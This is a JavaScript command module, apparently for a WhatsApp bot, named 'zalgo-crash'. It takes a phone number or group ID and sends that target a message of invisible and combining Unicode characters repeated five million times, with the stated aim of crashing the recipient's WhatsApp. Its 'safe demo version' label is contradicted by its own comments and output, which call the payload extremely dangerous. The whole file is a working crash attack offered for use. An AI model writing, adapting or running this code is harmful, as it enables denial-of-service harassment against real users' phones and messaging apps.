
export default {
  name: "zalgo-crash",
  description: "Send zalgo character payload to crash target (safe demo version)",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?zalgo-crash <number/group>\n\nExample:\n?zalgo-crash 234XXXXXXXXXX\n?zalgo-crash 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing zalgo-crash on target: ${target}`);

      // ⚠️ EXTREMELY DANGEROUS VERSION - WILL CRASH TARGET
      const zalgoChar = "█"; // heavy character, common in lag payloads
      const zalgoUnicode = "\u200B\u200C\u200D\u200E\u200F█\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307"; // Combined zalgo + invisible chars
      const payload = zalgoUnicode.repeat(5000000); // 5 MILLION repetitions - EXTREMELY DANGEROUS

      console.log(`[INFO] Zalgo payload length: ${payload.length} characters`);

      // Send the zalgo payload
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `💀 EXTREMELY DANGEROUS zalgo payload sent to ${target}!\n📊 Payload size: ${payload.length} characters\n⚠️ WARNING: This WILL crash the target's WhatsApp!`
      });

    } catch (error) {
      console.error(`[ERROR] Zalgo-crash command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send zalgo crash: " + error.message
      });
    }
  }
};
